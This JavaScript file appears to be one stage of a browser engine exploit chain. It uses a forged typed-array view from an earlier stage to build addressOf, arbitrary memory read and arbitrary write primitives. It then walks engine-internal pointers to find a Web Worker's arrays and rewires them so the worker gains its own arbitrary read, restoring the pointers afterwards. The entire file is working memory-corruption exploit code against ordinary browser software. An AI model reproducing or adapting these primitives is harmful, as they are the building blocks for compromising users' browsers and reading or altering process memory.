// Prove a bounded worker-side read of the transferred, owned 16-byte marker.
// The page wires two worker-owned pointers temporarily and restores both.
return new Promise(function (resolve) {
  var state = window.__fw14ArrayState;
  var worker = null;
  var workerUrl = null;
  var timer = null;
  var settled = false;
  var phase = "preflight";
  var restoreWorker = null;
  var heldMarker = null;
  function finish(status, details) {
    if (settled) return;
    settled = true;
    if (timer !== null) clearTimeout(timer);
    if (restoreWorker) {
      try {
        details.worker_restored = restoreWorker();
        if (!details.worker_restored) status = "fail";
      } catch (error) {
        details.restore_error = String(error).slice(0, 180);
        status = "error";
      }
    }
    if (worker) worker.terminate();
    if (workerUrl) URL.revokeObjectURL(workerUrl);
    heldMarker = null;
    resolve([{ id: "worker_owned_read_v1", status: status, details: details }]);
  }
  try {
    if (!state || !state.view || !state.array || !state.a ||
        !state.ownedTypedView || !state.calibratedViewBase ||
        state.array[0] !== state.a)
      throw new Error("held_view_missing");
    var forged = state.view;
    var a = state.ownedTypedView;
    var base = state.calibratedViewBase;
    if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
        !Number.isSafeInteger(base) || base % 4096 !== 0)
      throw new Error("held_view_canary_or_base_changed");
    function bytesAt(index) {
      var out = [];
      for (var i = 0; i < 8; i++) out.push(forged[index + i]);
      return out;
    }
    function integerOf(bytes) {
      var out = 0;
      for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
      return out;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(value) {
      try {
        state.array[0] = value;
        return integerOf(bytesAt(state.index));
      } finally {
        state.array[0] = state.a;
      }
    }
    var aIndex = addressOf(a) - base;
    var slot = aIndex + 8;
    if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
      throw new Error("owned_pointer_slot_outside_view");
    var original = bytesAt(slot);
    function readAt(address, length) {
      length = length || 24;
      if (length < 8 || length > 32)
        throw new Error("read_length_invalid");
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000 || address % 8 !== 0)
        throw new Error("candidate_address_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        var out = [];
        for (var j = 0; j < length; j++) out.push(a[j]);
        return out;
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function writeAt(address, bytes) {
      if (!Number.isSafeInteger(address) || address < 0x100000000 ||
          address >= 0x1000000000000 || address % 8 !== 0 ||
          !bytes || bytes.length !== 8)
        throw new Error("write_target_invalid");
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        for (var j = 0; j < 8; j++) a[j] = bytes[j];
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function same(left, right) {
      if (left.length !== right.length) return false;
      for (var i = 0; i < left.length; i++)
        if (left[i] !== right[i]) return false;
      return true;
    }
    function u32(bytes, at) {
      return (bytes[at] | (bytes[at + 1] << 8) |
              (bytes[at + 2] << 16) | (bytes[at + 3] << 24)) >>> 0;
    }
    function ptr(bytes, at) {
      return integerOf(bytes.slice(at, at + 8));
    }
    function validPointer(value) {
      return Number.isSafeInteger(value) && value >= 0x100000000 &&
             value < 0x1000000000000 && value % 8 === 0;
    }
    phase = "worker_create";
    if (typeof Worker !== "function" || typeof Blob !== "function")
      throw new Error("worker_unavailable");
    var workerSource = [
      "var marker = new Uint32Array(new ArrayBuffer(0x10));",
      "var roots = [];",
      "var leak = null, master = null, victim = null;",
      "self.onmessage = function (event) {",
      "  if (event.data && event.data.name === 'ping') {",
      "    self.postMessage({ id: 0, type: 'ret', value: 'pong' });",
      "    return;",
      "  }",
      "  if (event.data && event.data.name === 'read') {",
      "    master[4] = event.data.lo >>> 0;",
      "    master[5] = event.data.hi >>> 0;",
      "    var words = [];",
      "    for (var i = 0; i < 4; i++)",
      "      words.push(victim.getUint32(i * 4, true));",
      "    self.postMessage({ id: 2, type: 'ret', value: words });",
      "    return;",
      "  }",
      "  leak = { value: null };",
      "  master = new Uint32Array(6);",
      "  victim = new DataView(new ArrayBuffer(48));",
      "  marker[0] = 0x7a6b5c4d; marker[1] = 0x1234cafe;",
      "  marker[2] = 0x55aa33cc; marker[3] = 0xcc33aa55;",
      "  marker.leak = leak; marker.master = master; marker.victim = victim;",
      "  roots = [marker, leak, master, victim];",
      "  self.postMessage({ id: 1, type: 'ret', value: marker }, [marker.buffer]);",
      "};"
    ].join("\n");
    workerUrl = URL.createObjectURL(new Blob([workerSource],
                                        { type: "text/javascript" }));
    worker = new Worker(workerUrl);
    timer = setTimeout(function () {
      finish("error", { phase: "worker_reply", error: "timeout" });
    }, 6000);
    worker.onerror = function (event) {
      finish("error", { phase: "worker", error: String(event.message || "worker_error").slice(0, 180) });
    };
    var pingDone = false;
    var waitingForRead = false;
    worker.onmessage = function (event) {
      if (settled) return;
      try {
        if (!pingDone) {
          if (!event.data || event.data.id !== 0 ||
              event.data.value !== "pong")
            throw new Error("worker_ping_mismatch");
          pingDone = true;
          worker.postMessage({ id: 1, name: "init", args: [] });
          return;
        }
        if (waitingForRead) {
          phase = "worker_readback";
          var reply = event.data;
          var words = reply && reply.id === 2 &&
            reply.type === "ret" && reply.value;
          var matched = Array.isArray(words) && words.length === 4 &&
            words[0] === 0x7a6b5c4d && words[1] === 0x1234cafe &&
            words[2] === 0x55aa33cc && words[3] === 0xcc33aa55;
          finish(matched ? "pass" : "fail",
                 { read_matched: matched,
                   words: Array.isArray(words) ? words.map(function (value) {
                     return (value >>> 0).toString(16);
                   }).join(",") : null });
          return;
        }
        phase = "transferred_marker";
        var typed = event.data && event.data.type === "ret" &&
          event.data.id === 1 && event.data.value;
        var markersOk = typed instanceof Uint32Array && typed.length === 4 &&
          typed[0] === 0x7a6b5c4d && typed[1] === 0x1234cafe &&
          typed[2] === 0x55aa33cc && typed[3] === 0xcc33aa55;
        if (!markersOk) throw new Error("transferred_marker_mismatch");
        heldMarker = typed;
        phase = "buffer_cell";
        var cell = addressOf(typed.buffer);
        if (!validPointer(cell)) throw new Error("buffer_cell_invalid");
        var cellBytes = readAt(cell);
        var impl = ptr(cellBytes, 0x10);
        if (!validPointer(impl)) throw new Error("buffer_impl_invalid");
        phase = "buffer_impl";
        var implBytes = readAt(impl);
        var data = ptr(implBytes, 0x10);
        if (!validPointer(data)) throw new Error("buffer_data_invalid");
        phase = "worker_backing";
        var backing = readAt(data);
        var backingOk = u32(backing, 0) === 0x7a6b5c4d &&
          u32(backing, 4) === 0x1234cafe &&
          u32(backing, 8) === 0x55aa33cc &&
          u32(backing, 12) === 0xcc33aa55;
        if (!backingOk) throw new Error("worker_backing_mismatch");
        phase = "storage_chain";
        var storage = ptr(backing, 0x10);
        if (!validPointer(storage)) throw new Error("storage_pointer_invalid");
        var message = ptr(readAt(storage), 8);
        if (!validPointer(message)) throw new Error("message_pointer_invalid");
        var butterfly = ptr(readAt(message), 8);
        if (!validPointer(butterfly) || butterfly < 0x100000018)
          throw new Error("butterfly_pointer_invalid");
        phase = "worker_references";
        var master = 0, victim = 0, leak = 0;
        var masterIndex = 0, victimIndex = 0, leakIndex = 0;
        var seen = 0, shapes = [];
        for (var index = 1; index <= 8; index++) {
          var candidate = ptr(readAt(butterfly - index * 8, 8), 0);
          if (!validPointer(candidate) ||
              Math.abs(candidate - cell) >= 0x40000000) continue;
          var candidateBytes = readAt(candidate, 32);
          var length = u32(candidateBytes, 24);
          var inline = ptr(candidateBytes, 16);
          seen++;
          shapes.push(index + ":" + length);
          if (!master && length === 6 && validPointer(inline)) {
            master = candidate; masterIndex = index;
          } else if (!victim && length === 48 && validPointer(inline)) {
            victim = candidate; victimIndex = index;
          } else if (!leak && u32(candidateBytes, 16) === 2 &&
                     u32(candidateBytes, 20) === 0) {
            leak = candidate; leakIndex = index;
          }
        }
        var shapeOk = !!(master && victim && leak) &&
          master !== victim && master !== leak && victim !== leak;
        if (!shapeOk) throw new Error("worker_shapes_missing");
        phase = "wire_worker";
        var masterOriginal = readAt(master + 16, 8);
        var victimOriginal = readAt(victim + 16, 8);
        if (!validPointer(ptr(masterOriginal, 0)) ||
            !validPointer(ptr(victimOriginal, 0)))
          throw new Error("worker_vectors_invalid");
        var masterTouched = false;
        var victimTouched = false;
        restoreWorker = function () {
          if (victimTouched) writeAt(victim + 16, victimOriginal);
          if (masterTouched) writeAt(master + 16, masterOriginal);
          return same(readAt(master + 16, 8), masterOriginal) &&
            same(readAt(victim + 16, 8), victimOriginal) &&
            a[0] === 0x31 && a[7] === 0xa8 &&
            same(bytesAt(slot), original) && state.array[0] === state.a;
        };
        masterTouched = true;
        writeAt(master + 16, pointerBytes(victim));
        if (ptr(readAt(master + 16, 8), 0) !== victim)
          throw new Error("worker_master_wire_failed");
        // The worker's indexed writes through master will retarget victim.
        victimTouched = true;
        waitingForRead = true;
        phase = "worker_read";
        worker.postMessage({ id: 2, name: "read", lo: data >>> 0,
                             hi: Math.floor(data / 0x100000000) >>> 0 });
      } catch (error) {
        finish("error", { phase: phase, error: String(error).slice(0, 180) });
      }
    };
    worker.postMessage({ id: 0, name: "ping", args: [] });
  } catch (error) {
    finish("error", { phase: phase, error: String(error).slice(0, 180) });
  }
});
